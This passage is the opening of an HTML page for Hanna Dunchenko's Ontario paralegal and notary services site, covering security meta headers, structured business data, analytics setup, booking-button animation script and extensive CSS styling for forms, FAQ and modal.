<!DOCTYPE html>
<html lang="en">
<head>
    <!-- <?php /* bootstrap: include __DIR__ . '/inc/init.php'; */ ?> -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta http-equiv="Permissions-Policy" content="camera=(self), microphone=(), geolocation=(self)">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' data: https://fonts.gstatic.com; img-src 'self' data: https://www.google-analytics.com; frame-src https://www.google.com/maps/ https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/; connect-src 'self' https://script.google.com/ https://script.googleusercontent.com/ https://www.google-analytics.com https://analytics.google.com https://api.ipify.org https://www.google.com/recaptcha/;">
    <meta name="description" content="Professional legal advocacy and notary services in Ontario. Specializing in Provincial Offences and Administrative Tribunals. Accessible, expert representation tailored to your needs.">
    <title>Hanna Dunchenko Paralegal Services Province Wide +1 437 239 6833 | Ontario</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22 fill=%22%23ffffff%22>PS</text></svg>">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700;900&display=swap" rel="stylesheet">
    
    <!-- Schema.org (JSON-LD) -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "LegalService",
      "name": "Hanna Dunchenko Paralegal Services",
      "image": "https://hannadunchenko.com/logo.png",
      "@id": "https://hannadunchenko.com",
      "url": "https://hannadunchenko.com",
      "telephone": "+14372396833",
      "address": {
        "@type": "PostalAddress",
        "addressLocality": "Toronto",
        "addressRegion": "ON",
        "addressCountry": "CA"
      },
      "geo": {
        "@type": "GeoCoordinates",
        "latitude": 43.6532,
        "longitude": -79.3832
      },
      "openingHoursSpecification": {
        "@type": "OpeningHoursSpecification",
        "dayOfWeek": [
          "Monday",
          "Tuesday",
          "Wednesday",
          "Thursday",
          "Friday"
        ],
        "opens": "10:00",
        "closes": "17:00"
      },
      "description": "Professional paralegal and notary services in Ontario. Specializing in Provincial Offences, LTB, and Traffic Ticket Defense. Proffesional representation in Toronto, Mississauga, and province-wide online."
    }
    </script>
    
    <!-- Google Analytics (GA4) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZMMKRZ3VBV"></script>
    <script>
        // Always start from the top on hard reloads and direct visits.
        if ('scrollRestoration' in history) {
            history.scrollRestoration = 'manual';
        }
        const forceScrollTop = () => {
            window.scrollTo(0, 0);
            document.documentElement.scrollTop = 0;
            document.body.scrollTop = 0;
        };
        window.addEventListener('pageshow', forceScrollTop);
        window.addEventListener('load', forceScrollTop);

        // --- Book Button Animation Logic ---
        const IS_LOW_END_DEVICE_FOR_JUMP = (
            (typeof navigator.hardwareConcurrency === 'number' && navigator.hardwareConcurrency > 0 && navigator.hardwareConcurrency <= 4) ||
            (typeof navigator.deviceMemory === 'number' && navigator.deviceMemory > 0 && navigator.deviceMemory <= 4)
        );
        const BOOK_BTN_FIRST_PARTICLES_EVENT = 'header-book-btn-first-particles-done';
        let headerNearestHintUnlockDispatched = false;

        function dispatchHeaderNearestHintUnlock(delayMs = 0) {
            if (headerNearestHintUnlockDispatched) return;
            headerNearestHintUnlockDispatched = true;
            const safeDelay = Math.max(0, Number(delayMs) || 0);
            setTimeout(() => {
                window.dispatchEvent(new CustomEvent(BOOK_BTN_FIRST_PARTICLES_EVENT));
            }, safeDelay);
        }

        function startBookBtnJumping(btnId, preloaderId) {
            const btn = document.getElementById(btnId);
            const preloader = document.getElementById(preloaderId);
            if (!btn) return;

            // Inject CSS jump animation
            if (!document.getElementById('book-btn-jump-style')) {
                const style = document.createElement('style');
                style.id = 'book-btn-jump-style';
                style.innerHTML = `
                @keyframes bookBtnJump {
                    0% { transform: scale(1) translateY(0); }
                    10% { transform: scale(1.08, 0.92) translateY(-6px); }
                    20% { transform: scale(0.95, 1.05) translateY(-12px); }
                    30% { transform: scale(1.05, 0.95) translateY(-8px); }
                    40% { transform: scale(1, 1) translateY(0); }
                    100% { transform: scale(1, 1) translateY(0); }
                }
                .footer-book-btn.book-btn-jump {
                    animation: bookBtnJump 0.7s cubic-bezier(.36,1.56,.64,1) 1;
                }
                `;
                document.head.appendChild(style);
            }

            let jumpedOnce = false;
            let jumpScheduleStarted = false;
            function doJumpWithSparks() {
                let sparkLifetimeMs = 0;
                if (btn.style.opacity === '1' && btn.style.pointerEvents !== 'none') {
                    btn.classList.add('book-btn-jump');
                    sparkLifetimeMs = Number(createSparks(btn)) || 0;
                    setTimeout(() => btn.classList.remove('book-btn-jump'), 800);
                }
                return sparkLifetimeMs;
            }
            function startJumpScheduleOnce() {
                if (jumpScheduleStarted) return;
                jumpScheduleStarted = true;
                scheduleJump();
            }
            window.__triggerHeaderBookFirstSparkByTypewriter = function triggerHeaderBookFirstSparkByTypewriter() {
                if (!jumpedOnce) return 0;
                const sparkLifetimeMs = doJumpWithSparks();
                startJumpScheduleOnce();
                return sparkLifetimeMs;
            };
            function scheduleJump() {
                const min = IS_LOW_END_DEVICE_FOR_JUMP ? 9000 : 5000;
                const max = IS_LOW_END_DEVICE_FOR_JUMP ? 18000 : 12000;
                const delay = Math.floor(Math.random() * (max - min + 1)) + min;
                setTimeout(() => {
                    if (!document.hidden) {
                        doJumpWithSparks();
                    }
                    scheduleJump();
                }, delay);
            }
            // Wait until preloader fades and button becomes visible
            const observer = new MutationObserver(() => {
                if (preloader && preloader.style.opacity === '0' && btn.style.opacity === '1' && !jumpedOnce) {
                    jumpedOnce = true;
                    setTimeout(() => {
                        // Unlock resolved typewriter as soon as button is visible.
                        // First particle flash is triggered later by typewriter completion (+1s).
                        dispatchHeaderNearestHintUnlock(0);
                    }, 400); // slightly faster to avoid visible delay
                }
            });
            if (preloader) {
                observer.observe(preloader, { attributes: true, attributeFilter: ['style'] });
            }
        }

        // Start only for headerBookBtn (footer has no jump animation)
        document.addEventListener('DOMContentLoaded', function() {
            startBookBtnJumping('headerBookBtn', 'headerBookBtnPreloader');
        });
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-ZMMKRZ3VBV');
    </script>
    <style>
                        /* Smooth fade-in for booking modal */
                        #bookingModal {
                            opacity: 0;
                            transform: translateY(40px) scale(0.98);
                            pointer-events: none;
                            transition: opacity 0.5s cubic-bezier(.4,1.6,.6,1), transform 0.5s cubic-bezier(.4,1.6,.6,1);
                        }
                        #bookingModal.modal--active {
                            opacity: 1;
                            /* Keep active modal untransformed so fixed CTA bar is anchored to viewport */
                            transform: none;
                            pointer-events: auto;
                        }
                h1, h2, h3,
                .section-title,
                .header__content-header,
                .header__content-subheader,
                .faq__question,
                .modal__title,
                .modal__section-title {
                    font-family: 'Lato', sans-serif;
                    color: #fff;
                    font-weight: 800;
                    text-transform: uppercase;
                    letter-spacing: 1.5px;
                    margin-top: 0;
                    margin-bottom: 1.3rem;
                    line-height: 1.2;
                    text-align: left;
                }
                h1, .section-title, .modal__title {
                    font-size: clamp(1.7rem, 5vw, 2.2rem);
                }
                h2, .header__content-header {
                    font-size: clamp(1.3rem, 4vw, 1.7rem);
                }
                h3, .header__content-subheader, .faq__question, .modal__section-title {
                    font-size: clamp(1.05rem, 3vw, 1.25rem);
                    margin-bottom: 2rem; /* Increased spacing between question and answer */
                }
                p, .header__content-text, .faq__answer, .modal__text, .footer__hours, .footer__copyright {
                    font-family: 'Lato', sans-serif;
                    font-size: 1rem;
                    font-weight: 400;
                    color: rgba(255,255,255,0.92);
                    line-height: 1.6;
                    margin-bottom: 0.72rem;
                    text-align: left;
                    letter-spacing: 0.01em;
                }
                ul, ol {
                    margin-bottom: 2rem;
                }
                .header__content-block, .header__service-item, .contact-form, .footer {
                    margin-bottom: 2.5rem !important;
                }
                .footer-book-btn, .contact-form__submit-button {
                    font-size: 1rem;
                    font-weight: 600;
                    padding: 0.8rem 2rem;
                    border-radius: 2rem;
                    margin: 0 auto 2.5rem auto;
                    display: block;
                }
                @media (max-width: 700px) {
                    h1, .section-title, .modal__title { font-size: 1.2rem; }
                    h2, .header__content-header { font-size: 1.05rem; }
                    h3, .header__content-subheader, .faq__question, .modal__section-title { font-size: 0.97rem; }
                    p, .header__content-text, .faq__answer, .modal__text, .footer__hours, .footer__copyright {
                        font-size: 0.97rem;
                        text-align: left;
                    }
                    .footer-book-btn, .contact-form__submit-button { font-size: 0.97rem; padding: 0.7rem 1.2rem; }
                }
        /* Proportional lock: keep desktop CSS proportions */
        html {
            font-size: 16px;
            -webkit-text-size-adjust: 100%;
            text-size-adjust: 100%;
        }

        body {
            font-size: 1rem;
        }

        /* ------------------- CORE STYLES ------------------- */
        :root {
            --bg-dark: #bfa792;
            --text-white: #ffffff;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.15);
            --placeholder-color: rgba(255, 255, 255, 0.6);
            --accent-gold: #6B5B4A;
            --accent-hover: #8B6F5A;
            --input-bg: rgba(255, 255, 255, 0.05);
            --services-line-height: 1.5;
            --services-paragraph-spacing: 0.35em;
            --major-block-gap: clamp(2rem, 4.8vw, 3.2rem);
            --layout-stack-gap: clamp(2rem, 4.5vw, 3rem);
            --hero-contact-gap-bottom: clamp(1.45rem, 4vw, 2rem);
            --hero-book-gap-top: clamp(1.15rem, 3.2vw, 1.85rem);
            --hero-book-gap-bottom: clamp(2rem, 5.2vw, 3rem);
            --hero-phone-button-gap: clamp(1.45rem, 4vw, 2.2rem);
        }

        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
        }
        
        body, button, input, select, textarea {
            font-family: 'Lato', sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        @keyframes pulseText {
            0% { opacity: 0.4; }
            50% { opacity: 0.8; }
            100% { opacity: 0.4; }
        }

        .pulseText {
            animation: pulseText 2s infinite ease-in-out;
            font-weight: 800;
        }
        
        @keyframes blurReveal {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }

        body { 
            font-family: 'Lato', sans-serif; 
            background-color: var(--bg-dark); 
            color: var(--text-white); 
            line-height: 1.6; 
            min-height: 100vh;
            padding-bottom: 0;
            animation: blurReveal 4s ease-out forwards;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-rendering: optimizeLegibility;
            overflow-x: hidden;
        }

        /* Page scrollbar styling only (do not override nested system scrollbars) */
        html {
            scrollbar-width: thin; /* For Firefox */
            scrollbar-color: #5a3d2a transparent; /* thumb track */
            overflow-x: hidden;
        }
        html::-webkit-scrollbar,
        body::-webkit-scrollbar {
            width: 0.5rem;
            height: 0.5rem;
        }
        html::-webkit-scrollbar-track,
        body::-webkit-scrollbar-track {
            background: transparent;
        }
        html::-webkit-scrollbar-thumb,
        body::-webkit-scrollbar-thumb {
            background-color: #5a3d2a;
            border-radius: 0.6rem;
        }
        html::-webkit-scrollbar-thumb:hover,
        body::-webkit-scrollbar-thumb:hover {
            background-color: #6B5B4A;
        }
        html::-webkit-scrollbar-button,
        html::-webkit-scrollbar-button:single-button,
        html::-webkit-scrollbar-button:start:decrement,
        html::-webkit-scrollbar-button:end:increment,
        body::-webkit-scrollbar-button,
        body::-webkit-scrollbar-button:single-button,
        body::-webkit-scrollbar-button:start:decrement,
        body::-webkit-scrollbar-button:end:increment {
            display: none !important;
            width: 0 !important;
            height: 0 !important;
            background: transparent !important;
            border: 0 !important;
        }

        /* Scroll Fade-in Animation */
        .fade-in-section {
            opacity: 1; /* Was 0 */
            transform: none; /* Was translateY(1.9rem) */
            transition: opacity 1s ease-out, transform 1s ease-out;
        }
        .fade-in-section.is-hidden {
            opacity: 0;
            transform: translateY(1.9rem);
        }
        .fade-in-section.is-visible {
            opacity: 1;
            transform: translateY(0);
        }

        .blur-in-section {
            opacity: 0;
            filter: blur(1.3rem); /* 20px approx */
            transition: opacity 1.5s ease-out, filter 1.5s ease-out;
            transform: none !important; /* Disable slide-up */
        }
        .blur-in-section.is-visible {
            opacity: 1;
            filter: blur(0);
        }

        /* ------------------- BLOCKS ------------------- */

        /* Block: background */
        .background { 
            position: fixed; 
            inset: 0; 
            z-index: -1; 
            overflow: hidden; 
            background: #bfa792; 
        }

        .background__svg {
            width: 100%;
            height: 100%;
        }

        .background__stripe { 
            animation: anim-stripes 30s ease-in-out infinite; 
            will-change: transform; 
        }
        
        .background__stripe--delay-1 { animation-duration: 40s; animation-delay: -10s; }
        .background__stripe--delay-2 { animation-duration: 50s; animation-delay: -20s; }
        
        @keyframes anim-stripes {
            0%, 50%, 100% { transform: translate(0, 0) scaleX(1); }
            25% { transform: translate(2.5%, 1.5%) scaleX(1.06); }
            75% { transform: translate(-2.5%, -1.5%) scaleX(0.94); }
        }

        body.modal-is-open .background__stripe {
            animation-play-state: paused;
        }

        .background__stripes-overlay {
            mix-blend-mode: overlay;
        }
        
        /* Block: header */
        .header { 
            text-align: center; 
            width: min(96vw, 50rem);
            padding: clamp(1rem, 3.5vw, 2rem) clamp(0.85rem, 2.4vw, 1.3rem) clamp(1.5rem, 4.2vw, 2.5rem);
            max-width: 50rem;
            margin: 0 auto;
        }

        .header__title { 
            font-size: clamp(1.35rem, 5.2vw, 2.05rem); 
            font-weight: 800; 
            margin-bottom: 0.3rem;
            letter-spacing: 2px;
            text-transform: uppercase;
            opacity: 0.9;
        }

        .header__subtitle { 
            font-size: clamp(2rem, 10vw, 4.2rem); 
            font-weight: 800; 
            text-transform: uppercase;
            margin-bottom: 2rem;
            letter-spacing: -2px;
            line-height: 0.9;
        }

        .header__contact {
            margin: 0.1rem 0 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.8rem;
        }

        .header__contact--hero {
            margin-top: clamp(0.2rem, 0.8vw, 0.45rem);
            margin-bottom: var(--hero-phone-button-gap) !important;
            max-width: 45rem;
            width: 100%;
            margin-left: auto;
            margin-right: auto;
            padding: 0 clamp(0.75rem, 2.2vw, 1.3rem);
            text-align: center;
        }

        .header__contact-label {
            font-size: clamp(1.2rem, 4vw, 1.8rem);
            font-weight: 800;
            color: var(--text-white);
        }

        .header__phone-link { 
            font-size: clamp(1.2rem, 3vw, 1.6rem); 
            font-weight: 800; 
            color: #ffffff; 
            text-decoration: none; 
            transition: opacity 0.3s;
        }

        .header__phone-link:hover { opacity: 0.8; }

        /* Updated Header Content Styles */
        .header__content-block {
            margin: 4.4rem auto 3rem;
            text-align: left;
            width: min(94vw, 41rem);
            max-width: 41rem;
            padding: 0 clamp(0.8rem, 2.1vw, 1.2rem);
            color: #ffffff;
            font-family: inherit;
        }

        .header__content-header {
            font-size: clamp(1.4rem, 5vw, 1.8rem);
            font-weight: 800;
            margin: 4rem 0 2rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #ffffff;
            text-align: center;
        }

        .header__content-subheader {
            font-size: clamp(1.1rem, 3.5vw, 1.3rem);
            font-weight: 800;
            margin: 2rem 0 0.8rem;
            color: #ffffff;
            text-transform: uppercase;
        }

        .header__content-text {
            font-size: 1rem;
            line-height: 1.7;
            margin-bottom: 1.3rem;
            color: rgba(255,255,255,0.92);
            font-weight: 400;
            text-align: left;
            letter-spacing: 0.01em;
        }

        .header__content-text strong {
            color: #ffffff;
            font-weight: 800;
        }

        .header__content-block--intake-inline {
            display: none !important;
        }

        .header__description {
            --h1-fit-scale: 1;
            font-size: clamp(1.05rem, 3.6vw, 1.35rem);
            font-weight: 900;
            color: rgba(255, 255, 255, 0.92);
            margin: 0 auto 2.5rem;
            max-width: 41rem;
            line-height: 1.35;
            padding: 0 1.5rem;
            text-align: center;
            letter-spacing: 0.06em;
            font-family: 'Lato', sans-serif;
            display: flex;
            flex-direction: column;
            gap: 0.45rem;
            align-items: center;
        }
        
        .header__description span {
            display: block;
            width: max-content;
            max-width: none;
            white-space: nowrap;
            text-wrap: nowrap;
            overflow-wrap: normal;
            word-break: keep-all;
        }

        .header__description-phone {
            margin-top: clamp(0.35rem, 1vw, 0.6rem);
        }

        .header__description br {
            display: none;
        }

        /* Block: layout-container */
        .layout-container { 
            width: min(94vw, 41rem);
            max-width: 41rem; 
            margin: 0 auto 0; 
            padding: 0 clamp(0.8rem, 2.1vw, 1.2rem); 
        }
        
        /* Block: contact-form */
        .contact-form {
            width: 100%;
            background: transparent;
            border: none;
            padding: 0;
            box-shadow: none;
            border-radius: 0;
        }

        .contact-form__outside-title { 
            font-size: clamp(2.8rem, 10vw, 3.6rem); 
            margin-bottom: 2rem; 
            text-align: center; 
            font-weight: 900; 
            text-transform: uppercase; 
            letter-spacing: 2px;
            color: var(--text-white);
            line-height: 0.95;
        }

        #calendarHeaderTitle {
            font-size: clamp(1.7rem, 5.6vw, 2.35rem);
            letter-spacing: 1.2px;
            line-height: 1;
        }

        .contact-form__title { 
            display: none;
            font-size: clamp(1.4rem, 5vw, 1.8rem); 
            margin-bottom: 2rem; 
            text-align: center; 
            font-weight: 800; 
            text-transform: uppercase; 
            letter-spacing: 2px; 
        }

        .contact-form__group { 
            margin-bottom: 2rem; 
            position: relative; 
        }

        .contact-form__label-row { 
            display: flex; 
            justify-content: space-between; 
            margin-bottom: 0.5rem; 
        }

        .contact-form__label { 
            font-weight: 800; 
            text-transform: uppercase; 
            font-size: 0.9rem; 
            letter-spacing: 1px; 
        }

        .contact-form__input, 
        .contact-form__textarea, 
        .contact-form__select { 
            width: 100%; 
            padding: 1rem; 
            background: var(--input-bg); 
            border: 1px solid var(--glass-border); 
            border-radius: 0.8rem; 
            color: var(--text-white);
            font-size: 1rem; 
            outline: none; 
            transition: all 0.3s ease; 
            font-family: inherit; 
            -webkit-appearance: none;
            appearance: none;
            box-shadow: none; /* Remove iOS inner shadow */
            line-height: 1.3;
        }

        .contact-form__input,
        .contact-form__select,
        .custom-select__trigger {
            min-height: 3.3rem;
            height: 3.3rem;
            box-sizing: border-box;
        }

        .file-attach__btn {
            min-height: 5.25rem;
            height: 5.25rem;
            box-sizing: border-box;
        }

        .contact-form__input:focus, 
        .contact-form__textarea:focus, 
        .contact-form__input--has-content {
            background: #ffffff;
            color: #5a3d2a;
            caret-color: #5a3d2a;
            box-shadow: 0 2px 0.5rem rgba(0, 0, 0, 0.12);
            border-color: rgba(255, 255, 255, 0.5);
        }
        
        .contact-form__input::placeholder, 
        .contact-form__textarea::placeholder { 
            color: var(--placeholder-color); 
        }
        
        .contact-form__input:focus::placeholder, 
        .contact-form__textarea:focus::placeholder { 
            color: transparent; 
        }

        .contact-form__textarea { 
            resize: none; 
            min-height: 7.9rem;
            overflow-y: hidden;
        }
        
        .contact-form__char-counter {
            font-size: 0.8rem;
            opacity: 0.6;
            color: rgba(255, 255, 255, 0.6);
            transition: all 0.3s ease;
        }

        .contact-form__group:has(.contact-form__textarea:focus) .contact-form__char-counter {
            color: var(--accent-hover);
            opacity: 0.9;
        }

        .contact-form__textarea-accessories {
            position: relative;
        }

        .contact-form__file-upload {
            position: absolute;
            bottom: 1.3rem;
            right: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0.3rem; 
            cursor: pointer;
            z-index: 2;
        }

        .contact-form__upload-icon {
            width: 1.5rem;
            height: 1.5rem;
            color: rgba(255, 255, 255, 0.5);
            stroke: currentColor;
            fill: none;
            transition: all 0.3s ease;
            display: block;
            stroke-width: 1.5;
            opacity: 0.7;
        }

        .contact-form__file-upload:hover { transform: scale(1.1); }
        .contact-form__file-upload:hover .contact-form__upload-icon { stroke: var(--text-white); }
        
        .contact-form__textarea:focus ~ .contact-form__textarea-accessories .contact-form__upload-icon,
        .contact-form__group:has(.contact-form__textarea:focus) .contact-form__upload-icon {
            stroke: var(--accent-hover);
        }

        .contact-form__checkbox-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 1rem;
            margin-top: 1rem;
        }

        .contact-form__checkbox {
            width: 1.55rem;
            height: 1.55rem;
            border-radius: 0.48rem;
            margin: 0;
            padding: 0;
            appearance: none;
            -webkit-appearance: none;
            border: 2px solid rgba(255, 255, 255, 0.9);
            background: rgba(255, 255, 255, 0.16);
            cursor: pointer;
            flex-shrink: 0;
            transform: scale(1);
            position: relative;
            transition: transform 0.14s ease, filter 0.14s ease, background-color 0.14s ease, border-color 0.14s ease;
        }

        .contact-form__checkbox::after {
            content: "✓";
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -62%) scale(0.92);
            color: #5a3d2a;
            font-size: 1.76rem;
            font-weight: 900;
            line-height: 1;
            -webkit-text-stroke: 0.55px #5a3d2a;
            text-shadow:
                0.015em 0 #5a3d2a,
                -0.015em 0 #5a3d2a,
                0 0.015em #5a3d2a,
                0 -0.015em #5a3d2a;
            opacity: 0;
            transition: opacity 0.14s ease, transform 0.14s ease;
        }

        .contact-form__checkbox:hover {
            transform: scale(1.03);
            filter: brightness(1.05);
        }

        .contact-form__checkbox:active {
            transform: scale(0.98);
        }

        .contact-form__checkbox:focus-visible {
            outline: 2px solid rgba(255, 255, 255, 0.65);
            outline-offset: 2px;
        }

        .contact-form__checkbox:checked {
            transform: scale(1);
            background: #ffffff;
            border-color: #ffffff;
        }

        .contact-form__checkbox:checked::after {
            opacity: 1;
            transform: translate(-50%, -64%) scale(1.1);
        }

        .contact-form__checkbox:checked:hover {
            transform: scale(1.03);
        }

        .contact-form__checkbox-label {
            font-size: 1.08rem;
            font-weight: 900;
            cursor: pointer;
            font-family: 'Lato', sans-serif !important;
            letter-spacing: 0.01em;
            color: #ffffff;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        #bookingModal .contact-form__checkbox-wrapper.file-attach__terms .contact-form__checkbox-label {
            gap: 0.3rem;
            white-space: nowrap;
            flex-wrap: nowrap;
        }
        
        .contact-form__terms-link {
            color: #ffffff;
            text-decoration: none;
            cursor: pointer;
            transition: none;
            font-weight: 900;
            font-size: 1.02em;
            display: flex;
            align-items: center;
            text-shadow: none;
        }

        #bookingModal .contact-form__checkbox-wrapper.file-attach__terms .contact-form__terms-link {
            display: inline;
        }

        .contact-form__terms-word {
            text-decoration: underline;
            text-decoration-thickness: 0.09em;
            text-underline-offset: 0.1em;
        }

        .contact-form__terms-link:hover {
            color: #ffffff;
            text-shadow: none;
        }

        .faq-google-form-link {
            color: #ffffff !important;
            display: inline-flex;
            align-items: center;
            white-space: nowrap;
            font-weight: 700;
        }

        .faq-google-form-link:hover {
            color: #ffffff !important;
        }

        .recaptcha-wrap {
            display: none;
            margin: 0.2rem 0 0.75rem;
            text-align: center;
        }

        .recaptcha-wrap__hint {
            margin: 0 0 0.5rem 0;
            font-size: 0.85rem;
            font-weight: 700;
            color: rgba(255, 255, 255, 0.97);
            letter-spacing: 0.02em;
            text-align: center;
            animation: bookingHintSoftPulse 2.2s ease-in-out infinite;
        }

        @keyframes bookingHintSoftPulse {
            0%, 100% { opacity: 0.92; }
            50% { opacity: 1; }
        }

        .recaptcha-wrap #bookingRecaptchaWidget {
            display: inline-block;
            min-height: 78px;
        }

        .contact-form__submit-button { 
            width: 100%;
            padding: 0.8rem 2rem;
            background: #5a3d2a;
            color: #ffffff;
            border: none;
            border-radius: 2rem;
            font-weight: 600;
            font-size: 1rem;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 0 auto 2rem auto;
            position: relative;
            box-shadow: 0 2px 12px 0 rgba(255, 255, 255, 0.12);
        }

        #confirmBookingBtn {
            display: inline-block;
            width: auto;
            min-width: 14rem;
            max-width: 96%;
            padding: 0.8rem 2rem;
            min-height: 4.5rem;
            line-height: 1;
            font-weight: 900;
            font-size: clamp(1.2rem, 4vw, 2rem);
            letter-spacing: 0.06em;
            background: #5a3d2a;
            color: #ffffff;
            border: 1px solid #5a3d2a;
            box-shadow: none;
            border-radius: 999px;
            transition: background-color 0.2s ease, box-shadow 0.2s ease;
        }

        #confirmBookingBtn:hover {
            background: #ffffff !important;
            border-color: #ffffff !important;
            color: #5a3d2a !important;
            transform: none;
            box-shadow: none;
        }

        #confirmBookingBtn:active {
            background: #ffffff !important;
            border-color: #ffffff !important;
            color: #5a3d2a !important;
            transform: none;
        }

        #confirmBookingBtn {
            position: relative;
            z-index: 4;
            pointer-events: auto !important;
            touch-action: manipulation;
            white-space: normal;
        }
        
        .contact-form__submit-button:hover { 
            transform: translateY(-2px); 
            background: var(--accent-gold); 
            box-shadow: 0 0.5rem 1.3rem rgba(255, 255, 255, 0.35); 
        }

        /* Shadow Removal for Buttons inside Modals */
        .modal .contact-form__submit-button,
        .modal .contact-form__submit-button:hover {
            box-shadow: none !important;
        }

        .contact-form__note {
            text-align: center;
            font-size: 0.9rem;
            opacity: 0.75;
            margin-top: 1rem;
        }

        /* Block: section-title */
        .section-title { 
            font-size: clamp(1.4rem, 5vw, 1.8rem); font-weight: 800; 
            text-transform: uppercase; letter-spacing: 2px; 
            text-align: center; 
            margin: 5rem 0 2.5rem;
        }
        
        /* Block: faq */
        .faq { margin-top: 0; }

        .faq__item {
            margin-bottom: 1.2rem;
            padding: 0;
            text-align: left;
            position: relative;
        }

        .faq__question {
            font-weight: 800;
            font-size: clamp(1.05rem, 3.1vw, 1.24rem);
            text-transform: uppercase;
            display: flex;
            align-items: flex-start;
            gap: 0.78rem;
            cursor: pointer;
            margin-bottom: 0;
            list-style: none;
            line-height: 1.35;
            position: relative;
            padding-right: 2.1rem;
            user-select: none;
        }

        .faq__question::before {
            content: "";
            flex: 0 0 0.95rem;
            width: 0.95rem;
            height: 0.95rem;
            border: 2.4px solid rgba(255, 255, 255, 0.96);
            background: rgba(255, 255, 255, 0);
            border-radius: 50%;
            margin-top: 0.28rem;
            opacity: 0.96;
            box-shadow: inset 0 0 0 0 rgba(255, 255, 255, 0.95);
            transform: scale(1);
            transition: background 0.35s ease, box-shadow 0.35s ease, transform 0.35s ease;
        }

        .faq__question::after {
            content: "";
            position: absolute;
            right: 0.2rem;
            top: 0.34rem;
            width: 0.95rem;
            height: 0.95rem;
            border: none;
            background-repeat: no-repeat;
            background-position: center;
            background-size: 100% 100%;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='none'%3E%3Cpath d='M3 6l5 5 5-5' stroke='%23FFFFFF' stroke-width='3.6' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
            transform: rotate(0deg);
            transform-origin: center;
            transition: transform 0.35s ease, opacity 0.25s ease;
            opacity: 0.98;
        }

        .faq__question:focus-visible {
            outline: 2px solid rgba(255, 255, 255, 0.45);
            outline-offset: 4px;
            border-radius: 0.3rem;
        }

        .faq__answer {
            max-height: 0;
            overflow: hidden;
            opacity: 0;
            filter: blur(14px);
            transform: translateY(0.8rem) scale(0.985);
            margin-top: 0;
            margin-bottom: 0;
            padding-left: 2.03rem;
            padding-right: 1.8rem;
            font-family: 'Lato', sans-serif !important;
            font-size: 1.2rem !important;
            color: rgba(255, 255, 255, 0.92) !important;
            line-height: 1.6 !important;
            font-weight: 400 !important;
            text-align: left;
            letter-spacing: 0.01em;
            transition:
                max-height 0.35s ease,
                opacity 0.35s ease,
                filter 0.35s ease,
                transform 0.35s ease,
                margin-top 0.35s ease;
        }

        .faq__answer > * {
            opacity: 0;
            filter: blur(8px);
            transform: translateY(0.42rem);
            transition: opacity 0.35s ease, filter 0.35s ease, transform 0.35s ease;
        }

        .faq__item.is-open .faq__question::after {
            transform: rotate(180deg);
        }

        .faq__item.is-open .faq__question::before {
            background: rgba(255, 255, 255, 0.98);
            box-shadow: inset 0 0 0 2px rgba(255, 255, 255, 0.95);
            transform: scale(1.06);
        }

        .faq__item.is-open .faq__answer {
            max-height: 72rem;
            opacity: 1;
            filter: blur(0);
            transform: translateY(0) scale(1);
            margin-top: 0.7rem;
            margin-bottom: 1.2rem;
        }

        .faq__item.is-open .faq__answer > * {
            opacity: 1;
            filter: blur(0);
            transform: translateY(0);
        }

        .faq-no-date-action {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-top: 0.55rem;
            padding: 0.56rem 1rem;
            border: 1px solid rgba(255, 255, 255, 0.42);
            border-radius: 999px;
            background: rgba(255, 255, 255, 0.16);
            color: #ffffff;
            font-size: 0.92rem;
            font-weight: 800;
            letter-spacing: 0.02em;
            text-decoration: none;
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.2s ease, border-color 0.2s ease;
        }

        .faq-no-date-action:hover,
        .faq-no-date-action:focus-visible {
            background: rgba(255, 255, 255, 0.24);
            border-color: rgba(255, 255, 255, 0.6);
            transform: translateY(-1px);
            outline: none;
        }

        .faq-no-date-line {
            display: block;
        }

        .faq-no-date-line .faq-no-date-action {
            margin-top: 0;
            margin-left: 0.4rem;
            vertical-align: middle;
        }

        .price-note {
            font-size: 1rem;
            font-weight: 400;
            color: rgba(255,255,255,0.92);
            line-height: 1.7;
            text-align: left;
            letter-spacing: 0.01em;
            margin-bottom: 1.3rem;
            display: block;
            margin-top: 0;
        }

        /* Block: modal */
        .modal {
            display: none; /* Hidden by default */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(0.3rem);
            -webkit-backdrop-filter: blur(0.3rem);
            z-index: 20000; /* Increased to be above top-bar */
            align-items: center;
            justify-content: center;
